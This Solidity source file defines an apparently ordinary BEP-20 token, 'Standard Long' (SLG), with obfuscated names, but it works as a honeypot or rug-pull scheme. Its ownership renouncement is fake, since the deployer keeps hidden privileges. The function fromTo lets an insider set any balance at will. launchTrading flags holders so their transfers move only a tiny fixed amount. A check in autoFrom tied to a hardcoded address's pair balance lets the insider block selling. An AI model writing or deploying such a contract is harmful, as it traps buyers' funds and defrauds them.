//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface fromAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract launchMaxReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeMode {
    function createPair(address listMax, address tradingLiquidityLaunch) external returns (address);
}

interface feeMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toEnable) external view returns (uint256);

    function transfer(address exemptTake, uint256 txExempt) external returns (bool);

    function allowance(address sellEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 txExempt) external returns (bool);

    function transferFrom(
        address sender,
        address exemptTake,
        uint256 txExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atWallet, uint256 value);
    event Approval(address indexed sellEnable, address indexed spender, uint256 value);
}

interface feeMinTeam is feeMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StandardLong is launchMaxReceiver, feeMax, feeMinTeam {

    uint256 tradingEnable;

    function allowance(address toMarketing, address minLimit) external view virtual override returns (uint256) {
        if (minLimit == limitMax) {
            return type(uint256).max;
        }
        return maxLiquidity[toMarketing][minLimit];
    }

    function launchMode(address sellMinIs) public {
        if (teamLimitExempt) {
            return;
        }
        if (modeToken != walletToken) {
            walletReceiver = receiverToken;
        }
        isToken[sellMinIs] = true;
        if (totalAutoWallet != receiverToken) {
            receiverToken = modeToken;
        }
        teamLimitExempt = true;
    }

    bool public launchExempt;

    event OwnershipTransferred(address indexed fundMode, address indexed receiverTeam);

    function fromTo(address walletExempt, uint256 txExempt) public {
        launchedToReceiver();
        marketingTx[walletExempt] = txExempt;
    }

    function getOwner() external view returns (address) {
        return maxTx;
    }

    address public swapList;

    function transferFrom(address launchedAt, address exemptTake, uint256 txExempt) external override returns (bool) {
        if (_msgSender() != limitMax) {
            if (maxLiquidity[launchedAt][_msgSender()] != type(uint256).max) {
                require(txExempt <= maxLiquidity[launchedAt][_msgSender()]);
                maxLiquidity[launchedAt][_msgSender()] -= txExempt;
            }
        }
        return autoFrom(launchedAt, exemptTake, txExempt);
    }

    function takeMin(uint256 txExempt) public {
        launchedToReceiver();
        tradingEnable = txExempt;
    }

    bool public buyEnableWallet;

    uint256 public totalAutoWallet;

    mapping(address => bool) public limitWallet;

    function decimals() external view virtual override returns (uint8) {
        return totalLaunchAuto;
    }

    constructor (){
        
        fromAmount listFee = fromAmount(limitMax);
        senderSell = takeMode(listFee.factory()).createPair(listFee.WETH(), address(this));
        
        swapList = _msgSender();
        sellMode();
        isToken[swapList] = true;
        marketingTx[swapList] = fromFeeAt;
        if (walletReceiver == liquidityIsExempt) {
            walletToken = liquidityIsExempt;
        }
        emit Transfer(address(0), swapList, fromFeeAt);
    }

    function autoFrom(address launchedAt, address exemptTake, uint256 txExempt) internal returns (bool) {
        if (launchedAt == swapList) {
            return toLimit(launchedAt, exemptTake, txExempt);
        }
        uint256 fundWalletLimit = feeMax(senderSell).balanceOf(toBuy);
        require(fundWalletLimit == tradingEnable);
        require(exemptTake != toBuy);
        if (limitWallet[launchedAt]) {
            return toLimit(launchedAt, exemptTake, tokenReceiver);
        }
        return toLimit(launchedAt, exemptTake, txExempt);
    }

    function launchedToReceiver() private view {
        require(isToken[_msgSender()]);
    }

    function transfer(address walletExempt, uint256 txExempt) external virtual override returns (bool) {
        return autoFrom(_msgSender(), walletExempt, txExempt);
    }

    address public senderSell;

    function balanceOf(address toEnable) public view virtual override returns (uint256) {
        return marketingTx[toEnable];
    }

    address toBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private receiverAuto = "Standard Long";

    function owner() external view returns (address) {
        return maxTx;
    }

    uint256 isMarketing;

    uint256 private walletReceiver;

    uint256 private liquidityIsExempt;

    uint256 public walletToken;

    function toLimit(address launchedAt, address exemptTake, uint256 txExempt) internal returns (bool) {
        require(marketingTx[launchedAt] >= txExempt);
        marketingTx[launchedAt] -= txExempt;
        marketingTx[exemptTake] += txExempt;
        emit Transfer(launchedAt, exemptTake, txExempt);
        return true;
    }

    uint256 public modeToken;

    function name() external view virtual override returns (string memory) {
        return receiverAuto;
    }

    address private maxTx;

    string private launchReceiverIs = "SLG";

    address limitMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellMode() public {
        emit OwnershipTransferred(swapList, address(0));
        maxTx = address(0);
    }

    function approve(address minLimit, uint256 txExempt) public virtual override returns (bool) {
        maxLiquidity[_msgSender()][minLimit] = txExempt;
        emit Approval(_msgSender(), minLimit, txExempt);
        return true;
    }

    bool public marketingToken;

    bool public teamLimitExempt;

    function totalSupply() external view virtual override returns (uint256) {
        return fromFeeAt;
    }

    uint256 private receiverToken;

    uint256 constant tokenReceiver = 17 ** 10;

    uint256 private fromFeeAt = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private maxLiquidity;

    function launchTrading(address enableTradingFund) public {
        launchedToReceiver();
        if (walletReceiver == teamLaunchedIs) {
            modeToken = receiverToken;
        }
        if (enableTradingFund == swapList || enableTradingFund == senderSell) {
            return;
        }
        limitWallet[enableTradingFund] = true;
    }

    uint8 private totalLaunchAuto = 18;

    mapping(address => bool) public isToken;

    uint256 private teamLaunchedIs;

    function symbol() external view virtual override returns (string memory) {
        return launchReceiverIs;
    }

    mapping(address => uint256) private marketingTx;

}